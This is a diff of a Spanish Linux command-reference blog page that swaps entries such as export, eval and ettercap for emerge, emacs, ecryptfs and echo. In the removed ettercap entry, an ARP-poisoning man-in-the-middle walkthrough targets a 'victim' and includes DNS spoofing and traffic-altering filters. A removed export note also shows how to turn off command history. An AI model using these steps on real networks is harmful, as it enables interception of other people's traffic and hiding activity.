@@ -9,7 +9,7 @@
   <meta name="author" content="templix">
 
   
-  <meta name="description" content="Permite realizar operaciones aritméticas. $ expr 2 + 3 $ expr 2 * 3 (Para la multiplicación ha de anteponerse al signo la barra ) $ expr 12 / 2 $ sum &hellip;">
+  <meta name="description" content="Instalador de paquetes de gentoo aunque en realidad, emerge no es en si un instalador de paquetes, si no que se descargan las fuentes y se compilan &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -80,7 +80,7 @@
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/expr/">Expr</a></h1>
+      <h1 class="entry-title"><a href="/blog/emerge/">Emerge</a></h1>
     
     
       <p class="meta">
@@ -96,22 +96,50 @@
   
 
 
-<time datetime="2014-01-27T20:07:00+01:00" pubdate data-updated="true">27-01-2014</time>
+<time datetime="2014-01-28T17:49:00+01:00" pubdate data-updated="true">28-01-2014</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>Permite realizar operaciones aritméticas.</p>
+  <div class="entry-content"><p>Instalador de paquetes de gentoo aunque en realidad, emerge no es en si un instalador de paquetes, si no que se descargan las fuentes y se compilan para nuestro sistema.</p>
 
-<blockquote><p>$ expr 2 + 3</p>
+<blockquote><p># emerge -s paquete (Busca el paquete en el portage)</p>
 
-<p>$ expr 2 * 3 (Para la multiplicación ha de anteponerse al signo la barra )</p>
+<p># emerge paquete (Instala el paquete.</p>
 
-<p>$ expr 12 / 2</p>
+<p># emerge -p paquete (Muestra las dependencias para instalar el paquete)</p>
 
-<p>$ sum=<code>expr 5 + 3</code>; expr $sum * 2 (Enlazar operaciones)</p></blockquote>
+<p># emerge -f paquete (Descarga el paquete pero no lo compila)</p>
+
+<p># emerge -u paquete (Actualiza el paquete)</p>
+
+<p># emerge -C paquete (Desinstala el paquete)</p>
+
+<p># emerge sync (Actualiza el repositorio de paquetes del portage)</p>
+
+<p># emerge world (Reinstala todo el sistema. No recomendado)</p>
+
+<p># emerge -u world (Actualiza la distribución)</p>
+
+<p># emerge -b paquete (Compila el programa, lo instala y nos genera el binario)</p>
+
+<p># emerge -k paquete (Instala un paquete binario anteriormente compilado)</p>
+
+<p># emerge -k paquete (Reinstala un paquete del que ya tenemos el binario)</p>
+
+<p># emerge &#8211;update &#8211;deep &#8211;newuse world (Limpia de paquetes obsoletos)</p>
+
+<p># emerge –depclean (Continuar con depclean)</p>
+
+<p># revdep-rebuild (Y terminar. Precisa paquete gentoolkit)</p>
+
+<p># emerge &#8211;update &#8211;deep &#8211;with-bdeps=y &#8211;newuse world (Actualización completa del sistema cuando se ha modificado el /etc/make.conf)</p>
+
+<p># emerge &#8211;update &#8211;deep world (Actualizar con las dependencias)</p>
+
+<p># emerge &#8211;resume (Proseguir la compilación despues de pararla con Ctrl + c)</p></blockquote>
 </div>
   
   
@@ -124,7 +152,7 @@
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/export/">Export</a></h1>
+      <h1 class="entry-title"><a href="/blog/emacs/">Emacs</a></h1>
     
     
       <p class="meta">
@@ -140,40 +168,119 @@
   
 
 
-<time datetime="2014-01-27T20:07:00+01:00" pubdate data-updated="true">27-01-2014</time>
+<time datetime="2014-01-28T17:49:00+01:00" pubdate data-updated="true">28-01-2014</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>Exporta, almacena y lista variables. Para que los cambios sean permanentes, colocar la linea en .bashrc.</p>
+  <div class="entry-content"><p>Mucho más que un editor. Tratar sobre emacs es muy complejo, a parte de por la propia aplicación y por usar una terminologia propia [un fichero no se &#8220;abre&#8221; sino que se &#8220;visita&#8221;], porque las ordenes no coinciden si se lanza en una tty o sobre las X. Lo que sigue es un pequeño manual de primeros auxilios.</p>
 
-<blockquote><p># export PATH=${PATH}:/usr/local/bin   (incluir un dir en el path)</p>
+<p>Partes de la pantalla de emacs:</p>
 
-<p>$ export TMOUT=60 (Establece 60 segundos de inactividad antes de cerrar una sesión ssh)</p>
+<pre><code>. Barra de menú
 
-<p>$ export HISTCONTROL=”ignoreboth:erasedups” (no escribir en el history ni los comandos que empiecen por espacio, ni los duplicados y que además los elimine, dejando siempre el último)</p></blockquote>
+. Barra de herramienta [sólo modo gráfico]
 
-<p>Opciones para HISTCONTROL:</p>
+. Área de edición [puede dividirse en áreas más pequeñas llamadas ventanas.]
 
-<p>ignorespace: No guarda en history los comandos que empiecen por espacio.</p>
+. Área de eco (Donde salen los mensajes dirigidos al usuario)
 
-<p>ignoredups: No guarda los comandos repetidos.</p>
+. minibuffer (Donde el usuario entra información adicional para ejecutar un mandato)
+</code></pre>
 
-<p>ignoreboth: Alias para los dos parámetros anteriores.</p>
+<p>Aclarando el concepto búffer.- Se entiende por buffer una zona de memoria en la que se encuentra el texto objeto de edición. Cuando leemos un fichero, lo que hacemos es copiar su contenido a una zona de memoria [a un buffer] y durante la edición lo que modificamos es esa zona de memoria, el fichero como tal permanece inalterado hasta que explícitamente demos la orden de grabar en el disco las modificaciones. Cuando emacs se inicia se abren dos búffers que no están asociados a ningún fichero: <em>scratch</em> y <em>messages</em> [En ambos el nombre empieza y acaba por un asterisco, lo que indica que no es un búffer asociado a un fichero]</p>
 
-<p>erasedups: Elimina los comandos duplicados dejando el último ejecutado.</p>
+<p>Significado de algunas teclas en la terminologia de emacs:</p>
 
-<blockquote><p>$ export HISTFILE=/home/usuario/histfile.txt (redirigir los comandos ejecutados durante una sesión a un archivo)</p>
+<pre><code>Alt = M (meta)
 
-<p>$ export HISTFILE=/dev/null (Para no guardar el history de la sesión)</p>
+Crtl= C (control)
 
-<p>$ export HISTFILE=/dev/null bash (abrir otra sesión que no almacene los comandos sin perder los de la actual)</p>
+SPC (Barra espacio)
 
-<p>$ export PS1=&#8221;[\u@<code>curl icanhazip.com</code> \W]$ &#8221;  (Excentricidad: que el promt diga la ip externa.)</p>
+RET (intro)
 
-<p>$ export LANG=C; gedit (Lanzar una aplicación con un locale concreto)</p></blockquote>
+RETRO (retroceso)
+</code></pre>
+
+<p>Algunas teclas básicas:</p>
+
+<pre><code>M-x (Saltar al minibuffer con el cursor listo para escribir un mandato. Después de pulsar algunas letras, con la tecla "espacio" aparecerán los mandatos asociados a lo escrito [autocompletado])
+
+C-g (Cancelar el mandato que se está ejecutando o escribiendo en el minibuffer)
+
+C-x u (Deshacer la última acción. Ejecutándolo varias veces se irán deshaciendo acciones)
+
+C-x RET f (Para entrar la codificación de caracteres: latin-1-unix [latin1], utf-8-unix [utf8]..)
+
+M-x help-with-tutorial-spec-language (Se abrirá un buffer con los idiomas disponibles para el manual. Escribir Spanish y pulsar intro)
+
+C-h i (Abrir el manual)
+
+C-espacio (Donde está el cursor, empieza la selección de una palabra o párrafo)
+</code></pre>
+
+<p>Algunas ordenes en relación a los ficheros:</p>
+
+<pre><code>C-x C-f (Y escribir el nombre del archivo que se abrirá. Con TAB se autocompleta el nombre. Si el archivo no existe se creará)
+
+C-x C-s (Guardar archivo)
+
+C-x d (Abrir un directorio)
+
+C-x k (Cerrar archivo - Destruir búffer -) M-x (Saltar al minibuffer con el cursor listo para escribir un mandato. Después de pulsar algunas letras, con la tecla "espacio" aparecerán los mandatos asociados a lo escrito [autocompletado])
+
+C-g (Cancelar el mandato que se está ejecutando o escribiendo en el minibuffer)
+
+C-x u (Deshacer la última acción. Ejecutándolo varias veces se irán deshaciendo acciones)
+
+C-x RET f (Para entrar la codificación de caracteres: latin-1-unix [latin1], utf-8-unix [utf8]..)
+
+M-x help-with-tutorial-spec-language (Se abrirá un buffer con los idiomas disponibles para el manual. Escribir Spanish y pulsar intro)
+
+C-h i (Abrir el manual)
+
+C-espacio (Donde está el cursor, empieza la selección de una palabra o párrafo)
+
+C-x C-b (Ver listado de búffers abiertos)
+
+C-x b (Cambiar entre búffers)
+
+C-x C-c (Salir de emacs preguntando por guardar documento)
+
+C-x C-w (Salir y guardar con otro nombre)
+
+C-x s (Con varios búffers editados, comprobará si han sido modificados y preguntará para cada uno si guardar los cambios)
+
+C-z (Suspender)
+
+C-k (Cortar texto hasta el final de la linea)
+
+C-w (Cortar texto seleccionado)
+
+C-y (Pegar el último texto cortado)
+
+C-s (Buscar palabra hacia adelante)
+
+C-r (Buscar palabra hacia atras)
+</code></pre>
+
+<p>Algunas ordenes en relación con las ventanas:</p>
+
+<pre><code>C-x 0 (Borra la ventana activa)
+
+C-x 1 (Borra todas las ventanas menos la activa)
+
+C-x 2 (Divide horizontalmente la ventana activa en dos ventanas)
+
+C-x 3 (Divide verticalmente la ventana activa en dos ventanas)
+
+C-x o (Lleva el cursor a la próxima ventana)
+
+C-M-v (Desplaza hacia abajo el texto de la próxima ventana como usando AvPág)
+</code></pre>
 </div>
   
   
@@ -186,7 +293,7 @@
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/expiry/">Expiry</a></h1>
+      <h1 class="entry-title"><a href="/blog/elinks/">Elinks</a></h1>
     
     
       <p class="meta">
@@ -202,16 +309,29 @@
   
 
 
-<time datetime="2014-01-27T20:07:00+01:00" pubdate data-updated="true">27-01-2014</time>
+<time datetime="2014-01-28T17:49:00+01:00" pubdate data-updated="true">28-01-2014</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>Chequea cuando caducan las contraseñas de usuario [si son temporales]</p>
+  <div class="entry-content"><p>Navegador.</p>
 
-<blockquote><p>$ expiry -c</p></blockquote>
+<blockquote><p>$ elinks -dump fichero.html > fichero.txt  (Convierte un .html a .txt)</p></blockquote>
+
+<p>Atajos:</p>
+
+<pre><code>Esc (Ver/esconder los menús. Tambien F9)
+
+t (nueva pestaña)
+
+g (Entrar nueva url)
+
+&lt; &gt; (moverse entre pestañas a derecha o izquierda)
+
+Flechas del cursor derecha/izquierda (pagina anterior/posterior)
+</code></pre>
 </div>
   
   
@@ -224,7 +344,7 @@
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/expand/">Expand</a></h1>
+      <h1 class="entry-title"><a href="/blog/electricsheep/">Electricsheep</a></h1>
     
     
       <p class="meta">
@@ -240,18 +360,33 @@
   
 
 
-<time datetime="2014-01-27T20:07:00+01:00" pubdate data-updated="true">27-01-2014</time>
+<time datetime="2014-01-28T17:49:00+01:00" pubdate data-updated="true">28-01-2014</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>Convierte los tabuladores a espacios. Elimina las tabulaciones y los remplaza por espacios en blanco. Por defecto las tabulaciones son de 8 espacios en blanco.</p>
+  <div class="entry-content"><p>salva pantallas (screen saver) de arte abstracto en el que colaboran miles de personas en el mundo. Cuando los equipos &#8220;sueñan&#8221; ElectricSheep se enciende y comunica su ordenar con los demás a través de Internet para crear animaciones abstractas conocidas como &#8220;ovejas&#8221;. Para que salga como opción en xscreensaver:</p>
 
-<blockquote><p>$ expand -t 5 texto.txt (Convierte las tabulaciones en 5 espacios en blanco)</p>
+<blockquote><p>$ nano .xscreensaver</p></blockquote>
 
-<p>$ expand -i -t 5 texto.txt (Sólo afecta a las tabulaciones de principio de linea)</p></blockquote>
+<p>Añadir la linea al final del apartado:</p>
+
+<pre><code>....
+
+- GL:                           companioncube -root                         \n\
+
+- GL:                           hilbert -root                               \n\
+
+- GL:                           tronbit -root                               \n\
+
+                                unicode -root                               \n\
+
+                                electricsheep                               \n\
+</code></pre>
+
+<p>Nota.- Los videos se encuentran en ~/.electricsheep en formato .avi</p>
 </div>
   
   
@@ -264,7 +399,7 @@
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/exit/">Exit</a></h1>
+      <h1 class="entry-title"><a href="/blog/eject/">Eject</a></h1>
     
     
       <p class="meta">
@@ -280,14 +415,22 @@
   
 
 
-<time datetime="2014-01-27T20:07:00+01:00" pubdate data-updated="true">27-01-2014</time>
+<time datetime="2014-01-28T17:49:00+01:00" pubdate data-updated="true">28-01-2014</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>Salir del interprete de comandos.</p>
+  <div class="entry-content"><p>Abre/cierra la bandeja del cdrom</p>
+
+<blockquote><p>$ eject /dev/cdrom0    (Abre)</p>
+
+<p>$ eject -t /dev/cdrom0   (Cierra)</p>
+
+<p>$ eject /dev/cdrom; sleep 1; eject -t /dev/cdrom  (abrirlo y cerrarlo)</p>
+
+<p>$ eject sda8 (desmonta la partición mencionada)</p></blockquote>
 </div>
   
   
@@ -300,7 +443,7 @@
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/exiftool/">Exiftool</a></h1>
+      <h1 class="entry-title"><a href="/blog/egrep/">Egrep</a></h1>
     
     
       <p class="meta">
@@ -316,28 +459,40 @@
   
 
 
-<time datetime="2014-01-27T20:07:00+01:00" pubdate data-updated="true">27-01-2014</time>
+<time datetime="2014-01-28T17:49:00+01:00" pubdate data-updated="true">28-01-2014</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>Lee y extrae metadatos de imágenes</p>
+  <div class="entry-content"><p>[extended grep]. Busca expresiones regulares.</p>
 
-<blockquote><p>$ exiftool -a -u -g1 foto.png</p>
+<pre><code>$ egrep -v '^$|^#' archivo (suprimir lineas en blanco y comentadas)
 
-<p>$ exiftool -GPSAltitude=&#8221;0/1&#8221; foto.jpg  (Añadir tags a una imagen)</p>
+$ egrep -c '^#' /etc/fstab (Muestra el número de lineas comentadas)
+</code></pre>
 
-<p>$ exiftool -GPSLatitude=&#8221;41.403339&#8221; foto.jpg</p>
+<blockquote><p>$ egrep -in &#8220;palabra&#8221; *.txt (busca “palabra” en todos los .txt del directorio)</p>
 
-<p>$ exiftool -GPSLatitudeRef=&#8221;N&#8221; foto.jpg</p>
+<p>$ egrep &#8216;UUID|proc&#8217; /etc/fstab (Muestra las lineas con las coincidencias)</p>
 
-<p>$ exiftool -GPSLongitude=&#8221;2.1740288&#8221; foto.jpg</p>
+<p>$ egrep &#8211;color &#8216;(vmx|svm)&#8217; /proc/cpuinfo (Averiguar si el equipo  admite la virtualización por hardware. Si el comando no devuelve nada es porque no lo soporta)</p></blockquote>
 
-<p>$ exiftool -GPSLongitudeRef=&#8221;E&#8221; foto.jpg</p>
+<p>Otras opciones:</p>
 
-<p>$ exiftool -TagsFromFile imagen_datos.jpg imagenFinal.jpg (Copia los datos Exif de la foto &#8220;imagen_datos.jpg&#8221; a la foto &#8220;imagenFinal.jpg&#8221;)</p></blockquote>
+<pre><code>-h  Muestra las líneas coincidentes pero no los nombres de archivo. 
+
+-i  Ignora los cambios mayúsculas y minúsculas. 
+
+-n  Muestra la línea y el número de línea. 
+
+-r  Lee en todos los archivos de los directorios y subdirectorios. 
+
+-v  Muestra todas las lineas que no coinciden. 
+
+-w      Sólo coincidencia en palabras completas. 
+</code></pre>
 </div>
   
   
@@ -350,7 +505,7 @@
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/exif/">Exif</a></h1>
+      <h1 class="entry-title"><a href="/blog/ed/">Ed</a></h1>
     
     
       <p class="meta">
@@ -366,20 +521,71 @@
   
 
 
-<time datetime="2014-01-27T20:07:00+01:00" pubdate data-updated="true">27-01-2014</time>
+<time datetime="2014-01-28T17:49:00+01:00" pubdate data-updated="true">28-01-2014</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>Extraer metadatos de imagenes</p>
+  <div class="entry-content"><p>Editor de lineas.</p>
 
-<blockquote><p>$ exif -d imagen  (mostrar todos los datos)</p>
+<p>Teclas de control:</p>
 
-<p>$ exif -e imagen  (extraer la foto miniatura)</p>
+<pre><code>a (Añadir texto a partir de la línea indicada, o en la actual si no se indica)
 
-<p>$ exif -r imagen   (suprimir la foto miniatura)</p></blockquote>
+i (Inserta texto antes de línea indicada)
+
+c (Cambiar la línea o líneas indicadas)
+
+d (Borra la línea o las líneas indicadas)
+
+p (Visualiza la línea o el rango de líneas indicadas)
+
+n (Visualiza la línea o rango indicados mostrando su número)
+
+m3 (Mover la línea o rango de líneas a partir de la línea 3)
+
+t2 (Copiar la línea o rango de líneas indicado a partir de la línea 2)
+
+e[fic] (Carga el fichero indicado. No actúa si el fichero actual no está grabado)
+
+E[fic] (Carga el fichero indicado sin comprobar si el fichero actual está grabado o no)
+
+f[nombre] (Fija el nombre del fichero actual)
+
+r [fic] (Lee el fichero indicado añadiendo a partir de la línea indicada o de la última si no se indica)
+
+w [fic] (Graba las líneas indicadas, todas por defecto, en el fichero especificado o en el fichero actual por defecto)
+
+q (Sale del editor, emite un error si el fichero actual no fue grabado)
+
+Q (Igual que el anterior, sin comprobar si el fichero actual fue grabado)
+
+P (Activa /Desactiva el prompt del editor)
+
+H (Activa/Desactiva los mensaje explicativos de error)
+
+u (Deshace el último comando que puede deshacerse. Por ejemplo una inserción)
+
+!orden (Ejecuta la orden especificada llamando al intérprete de comandos sin salir del editor)
+
++5 (Avanza 5 líneas o una por defecto desde la línea actual)
+
+-4 (Retrocede 4 líneas o una por defecto desde la línea actual)
+
+^d (Vuelve al modo orden)
+
+g/cosa/n (Busca "cosa" y vusualiza la linea [n])
+
+G/cosa/ (Se posiciona una a una en todas las líneas dónde ha encontrado "cosa" y espera una orden o "intro" para continuar)
+
+v/cosa/n (Busca las líneas que no contengan la expresión "cosa" y las visualiza)
+
+V/cosa/ (Se posiciona en cada linea donde no ha encontrado "cosa" [todas por defecto] a espera de una orden o "intro" para continuar)
+
+s/cosa/casa/[g] (Busca las líneas que contienen "cosa" y substituye "cosa" por "casa"
+</code></pre>
 </div>
   
   
@@ -392,7 +598,7 @@
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/exec/">Exec</a></h1>
+      <h1 class="entry-title"><a href="/blog/ecryptfs/">Ecryptfs</a></h1>
     
     
       <p class="meta">
@@ -408,16 +614,62 @@
   
 
 
-<time datetime="2014-01-27T20:07:00+01:00" pubdate data-updated="true">27-01-2014</time>
+<time datetime="2014-01-28T17:49:00+01:00" pubdate data-updated="true">28-01-2014</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>Ejecuta comandos.</p>
+  <div class="entry-content"><p>[ecryptfs-utils cryptsetup]. Sistema de ficheros que permite encriptar la informacion. Puede ser montado en un sistema de ficheros convencional [ext4, ext3&#8230;] lo cual siginifica que no tenemos que preocuparnos por asignarle espacio: conforme añadimos o eliminamos archivos, el espacio crece o decrece. Se podría coger un solo fichero encriptado, enviarse a otro PC y acceder a la información de ese fichero usando la misma contraseña.</p>
 
-<blockquote><p>$ exec firefox</p></blockquote>
+<p>1.-</p>
+
+<p>Encriptar un directorio:</p>
+
+<blockquote><p>$ mkdir cripta (Crear directorio)</p>
+
+<p># chmod 700 cripta (Otorgarle permisos)</p>
+
+<p># mount -t ecryptfs cripta /media/tumba (Montar el directorio. Pregunta contraseña [la firma de la clave en el fichero /root/.ecryptfs/sig-cache.txt]. Las demás preguntas [método de cifrado, longitud de la contraseña&#8230;] pueden dejarse con las opciones por defecto)</p>
+
+<p># umount /media/tumba (Desmontar directorio)</p></blockquote>
+
+<p>Nota.- Es bastante usual, montar el directorio consigo mismo:</p>
+
+<blockquote><p># mount -t ecryptfs cripta cripta</p></blockquote>
+
+<p>2.-</p>
+
+<p>Ejecutar el asistente de creación de directorio cifrado:</p>
+
+<blockquote><p># ecryptfs-setup-private</p>
+
+<p># ecryptfs-umount-private (Desmontar el directorio)</p>
+
+<p># ecryptfs-mount-private (Montar el directorio)</p></blockquote>
+
+<p>Nota.- Para impedir que el directorio creado se monte automáticamente al inicio de sesión, borrar el archivo ~/.ecryptfs/auto-mount. Para revertir el proceso crear en el mismo directorio un archivo vacio:</p>
+
+<blockquote><p>$ touch ~/.ecryptfs/auto-mount</p></blockquote>
+
+<p>3.-</p>
+
+<p>Encriptar el directorio personal [$HOME]</p>
+
+<p>Salir de la cuenta de usuario y entrar en la de root.</p>
+
+<blockquote><p># modprobe ecryptfs (activar el módulo del kernel)</p>
+
+<p># ecryptfs-migrate-home -u USUARIO (Encriptar la $HOME del USUARIO)</p></blockquote>
+
+<p>Cerrar la cuenta de administrador y, sin reiniciar, entrar en la de USUARIO</p>
+
+<blockquote><p>$ ecryptfs-unwrap-passphrase (Pedirá la contraseña. Como medida de precaución es preciso anotar la cadena de texto que muestre)</p>
+
+<p># ecryptfs-setup-swap (Como media de seguridad es necesario encriptar la partición de intercambio [Swap])</p>
+
+<p># ecryptfs-rewrap-passphrase .ecryptfs/sig-cache.txt (Modificar la contraseña)</p></blockquote>
 </div>
   
   
@@ -430,7 +682,7 @@
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/eval/">Eval</a></h1>
+      <h1 class="entry-title"><a href="/blog/echo/">Echo</a></h1>
     
     
       <p class="meta">
@@ -446,77 +698,37 @@
   
 
 
-<time datetime="2014-01-27T20:07:00+01:00" pubdate data-updated="true">27-01-2014</time>
+<time datetime="2014-01-28T17:49:00+01:00" pubdate data-updated="true">28-01-2014</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>Toma los argumentos de la línea de comandos y los ejecuta como comandos.</p>
+  <div class="entry-content"><p>Muestra o incluye algo en un fichero.</p>
 
-<ul>
-<li>Tenemos un texto con variables:</li>
-</ul>
+<blockquote><p>$ echo $$   (muestra el PID de la consola)</p>
 
+<p>$ echo $PS1   (muestra el prompt)</p>
 
-<blockquote><p>$ nano entrada_web.txt</p></blockquote>
+<p># echo deb ftp://ftp.debian.org/debian etch main >> /etc/apt/source.list  (añade el repositorio mencionado al archivo sources.list)</p></blockquote>
 
-<pre><code>Hola $NOMBRE, felices de verte por la web $BLOG
+<p>Nota.- con un solo “>” pondria la linea especificada borrando todo lo demas.)</p>
+
+<blockquote><p>$ echo $((10*2)) (Realiza el cálculo matemático)</p>
+
+<p>$ echo “ Buenas.. voy a reiniciar ¿Haces algo?” >> /dev/pts/23 (Manda el mensaje a la consola 23)</p>
+
+<p>$ echo rm <em>.png (lista lo que se va a borrar, antes de lanzar rm </em>.png)</p>
+
+<p>$ echo &#8220;&#8221; > archivo.txt (Borra el contenido de archivo.txt. Para un borrado total mejor usar $ :> archivo.txt)</p></blockquote>
+
+<pre><code>$ echo -e "&lt;?php\nphpinfo();\n?&gt;" (la opción -e hace que se interprete los saltos de linea [\n], tabulaciones [\t] etc. en algunas distros es necesario lanzar: shopt -s extglob)
+
+$ echo -e "linux\\tes\\tgenial" (tabular cada palabra con \\t. La primera barra [\] sirva para escapar el caracter \t)
+
+$ echo -e "Dato1\n\tDato2\n\tDato3\n" &gt; ejemplo.txt (entra datos en ejemplo.txt con salto de linea despues de cada dato)
 </code></pre>
-
-<p>Y un script con el siguiente contenido:</p>
-
-<pre><code>#!/bin/bash
-
-echo "¿Como te llamas? " 
-
-read NOMBRE
-
-BLOG="lapipaplena.net"
-
-eval "echo "$(cat ./entrada_web.txt)""
-</code></pre>
-
-<ul>
-<li>Substituiendo las variables del script en el texto.</li>
-</ul>
-
-
-<p>Otro ejemplo de uso de eval:</p>
-
-<blockquote><p>$ nano ejemplo.sh</p></blockquote>
-
-<pre><code>#!/bin/bash
-
-pipe="/ |"
-
-#ls $pipe wc -l
-
-eval ls $pipe wc -l
-</code></pre>
-
-<p>Descomentar la linea del &#8220;ls&#8221; y comentar la de &#8220;eval&#8221; y observar la diferencia entre ambas salidas.</p>
-
-<ul>
-<li>Otro ejemplo:</li>
-</ul>
-
-
-<blockquote><p>$ nano ejemplo.sh</p></blockquote>
-
-<pre><code>#!/bin/bash
-
-X=10
-
-Y=X
-
-#echo '$'$Y
-
-eval echo '$'$Y
-</code></pre>
-
-<p>Descomentar la linea del &#8220;echo&#8221; y comentar la de &#8220;eval&#8221; y observar la diferencia entre ambas salidas.</p>
 </div>
   
   
@@ -529,7 +741,7 @@ eval echo '$'$Y
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/ettercap/">Ettercap</a></h1>
+      <h1 class="entry-title"><a href="/blog/ebook/">Ebook-</a></h1>
     
     
       <p class="meta">
@@ -545,142 +757,18 @@ eval echo '$'$Y
   
 
 
-<time datetime="2014-01-27T20:07:00+01:00" pubdate data-updated="true">27-01-2014</time>
+<time datetime="2014-01-28T17:49:00+01:00" pubdate data-updated="true">28-01-2014</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>[Dependencias: libcap2 libnet1 zlib1g libpthread-stubs0 libpcre3-dev libpcap-dev libcap-dev libnet6-1.3-0 libnet1-dev libssl-dev ncurses-bin libncurses5-dev libsdl-pango1 libatk1.0-dev]</p>
+  <div class="entry-content"><p>Convertir/visualizar a formato ebook.</p>
 
-<p>Snifador de red. Muestra pantallas solicitando aceptación de certificado en los navegadores de las victimas.</p>
+<blockquote><p>$ ebook-convert texto.pdf texto.epub</p>
 
-<p>descargar de http://ettercap.sourceforge.net/ y descomprimir</p>
-
-<blockquote><p>$ wget http://prdownloads.sourceforge.net/ettercap/ettercap-NG-0.7.3.tar.gz?download</p>
-
-<p>$ wget http://sourceforge.net/projects/ettercap/files/ettercap/NG-0.7.3/ettercap-NG-0.7.3.tar.gz/download</p>
-
-<p>$ tar -zvxf paquete</p>
-
-<p>$ cd ettercap-NG-0.7.3</p></blockquote>
-
-<pre><code>$ ./configure 
-
-$ make 
-
-# make install 
-</code></pre>
-
-<blockquote><p>$ ettercap -P list   (visualizar plugins instalados)</p></blockquote>
-
-<p>modificar archivo de configuración:</p>
-
-<blockquote><p># nano /etc/etter.conf</p></blockquote>
-
-<p>descomentar la linea:himne20-01-13 19:37Menos información</p>
-
-<blockquote><p># if you use iptables:</p></blockquote>
-
-<p>redir_command_on = &#8220;iptables -t nat -A PREROUTING -i %iface -p tcp &#8211;dport %port -j REDIRECT &#8211;to-port %rport&#8221;</p>
-
-<p>Y modificar:</p>
-
-<blockquote><p># the command used by the remote_browser plugin</p></blockquote>
-
-<p>remote_browser = &#8220;firefox -remote openurl(http://%host%url)&#8221;</p>
-
-<p>Para usar el plugin dns_spoof (Redireccionar páginas a otros sitios)</p>
-
-<blockquote><p># nano /usr/share/ettercap/etter.dns</p>
-
-<p># 3  Modos de especificar la redirección a localhost</p></blockquote>
-
-<pre><code>microsoft.com          A       192.168.1.2 
-
-*.microsoft.com        A       192.168.1.2 
-
-*google*               A       192.168.1.2
-</code></pre>
-
-<p>Para la sustitución de imagenes:</p>
-
-<blockquote><p># touch test2filter</p></blockquote>
-
-<p>Pegar:</p>
-
-<pre><code>if (ip.proto == TCP &amp;&amp; tcp.src == 80) { 
-
-replace("img src=", "img src=\"http://www.irongeek.com/images/jollypwn.png\" "); 
-
-replace("IMG SRC=", "img src=\"http://www.irongeek.com/images/jollypwn.png\" "); 
-
-msg("Filter ok.\n");
-</code></pre>
-
-<p>Configurar el sistema para que acepte todos los paquetes que detecte. Si al lanzar:</p>
-
-<blockquote><p># cat /proc/sys/net/ipv4/ip_forward</p></blockquote>
-
-<p>Si la respuesta no es 1, lanzar:</p>
-
-<blockquote><p># echo 1 > /proc/sys/net/ipv4/ip_forward</p></blockquote>
-
-<p>Arrancar la aplicación en ncurses [en terminal -> ettercap -T , en modo gtk -> ettercap -G y en modo demonio -> ettercap -D . En este último caso el análisis se realiza en los archivos de log]:</p>
-
-<blockquote><p># ettercap -C</p></blockquote>
-
-<p>Clicar en:</p>
-
-<pre><code>Sniff -&gt; Unifield sniffing 
-</code></pre>
-
-<p>Y aceptar [o poner] la red [eth0]. En la nueva pantalla, clic en:</p>
-
-<pre><code>Host -&gt; Scan for host 
-</code></pre>
-
-<p>Para escanear la red. Para visionar las máquina activas obtenidas, clic en:</p>
-
-<pre><code>Hosts -&gt; Hosts List 
-</code></pre>
-
-<p>Bajar con el cursor hasta la IP del router y pulsar la tecla &#8220;1&#8221;. Luego nos situamos sobre la IP del objetivo y pulsar la tecla &#8220;2&#8221; con lo que colocamos nuestra máquina entre el router y la máquina objetivo (envenenamiento arp). Luego en el cuadro que se abre con:</p>
-
-<pre><code>Mitm -&gt; Arp poisoning 
-</code></pre>
-
-<p>Parameters, ponemos:</p>
-
-<pre><code>remote
-</code></pre>
-
-<p>Y arrancamos el sniffer:</p>
-
-<pre><code>Start -&gt; Start sniffing 
-
-Para observar las conexiones que realiza la máquina objetivo: 
-
-View -&gt; Connections 
-
-Para terminar el ataque: 
-
-Mitm -&gt; Stop mitm atack 
-
-Start -&gt; Stop Sniffing 
-
-Start -&gt; Exit
-</code></pre>
-
-<p>Forma abreviada:</p>
-
-<pre><code># ettercap -Tq -M arp:remote -i eth0 ip_victima ip_router 
-
-O solo especificando la del router si se ataca toda la red: 
-</code></pre>
-
-<blockquote><p># ettercap -Tq -M arp:remote -i eth0 ip_router</p></blockquote>
+<p>$ ebook-viewer texto.epub (Visualiza con la apliciación calibre)</p></blockquote>
 </div>
   
   
@@ -711,43 +799,43 @@ O solo especificando la del router si se ataca toda la red:
   <ul id="recent_posts">
     
       <li class="post">
-        <a href="/blog/ifne/">ifne</a>
+        <a href="/blog/zypper/">zypper</a>
       </li>
     
       <li class="post">
-        <a href="/blog/ifdata/">ifdata</a>
+        <a href="/blog/zmore/">zmore</a>
       </li>
     
       <li class="post">
-        <a href="/blog/ifconfig/">ifconfig</a>
+        <a href="/blog/zmap/">zmap</a>
       </li>
     
       <li class="post">
-        <a href="/blog/identify/">identify</a>
+        <a href="/blog/zless/">zless</a>
       </li>
     
       <li class="post">
-        <a href="/blog/html/">html</a>
+        <a href="/blog/zip/">zip</a>
       </li>
     
       <li class="post">
-        <a href="/blog/hosts/">hosts</a>
+        <a href="/blog/zgrep/">zgrep</a>
       </li>
     
       <li class="post">
-        <a href="/blog/host-dot-conf/">host.conf</a>
+        <a href="/blog/zfgrep/">zfgrep</a>
       </li>
     
       <li class="post">
-        <a href="/blog/honeyproxy/">honeyproxy</a>
+        <a href="/blog/zenity/">zenity</a>
       </li>
     
       <li class="post">
-        <a href="/blog/hg/">hg</a>
+        <a href="/blog/zegrep/">zegrep</a>
       </li>
